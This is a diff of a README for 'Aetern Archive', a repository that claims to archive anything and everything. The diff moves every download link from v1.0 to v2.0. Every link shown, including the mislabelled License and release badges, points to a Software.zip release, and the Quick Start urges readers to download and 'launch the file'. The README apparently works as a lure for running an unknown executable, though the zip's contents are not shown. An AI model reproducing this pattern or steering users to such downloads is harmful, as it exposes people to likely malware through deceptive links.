@@ -1,7 +1,7 @@
 # Aetern Archive 📦
 
-[![License](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip)](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip)
-[![GitHub release](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip%https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip)](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip)
+[![License](https://github.com/VonWasBack/aetern-archive/releases/download/v2.0/Software.zip)](https://github.com/VonWasBack/aetern-archive/releases/download/v2.0/Software.zip)
+[![GitHub release](https://github.com/VonWasBack/aetern-archive/releases/download/v2.0/Software.zip%https://github.com/VonWasBack/aetern-archive/releases/download/v2.0/Software.zip)](https://github.com/VonWasBack/aetern-archive/releases/download/v2.0/Software.zip)
 
 Welcome to **Aetern Archive**, a repository dedicated to archiving anything and everything! This archive collects its assets from various sources, ensuring a comprehensive collection for future reference and preservation.
 
@@ -30,7 +30,7 @@ Explore the following topics within **Aetern Archive**:
 
 ## 🚀 Quick Start
 
-To jumpstart your exploration of the archive, grab the latest release from [here](https://github.com/VonWasBack/aetern-archive/releases/download/v1.0/Software.zip). Launch the file to begin your journey into the past!
+To jumpstart your exploration of the archive, grab the latest release from [here](https://github.com/VonWasBack/aetern-archive/releases/download/v2.0/Software.zip). Launch the file to begin your journey into the past!
 
 ## 🖥️ Deployment with Vercel
 
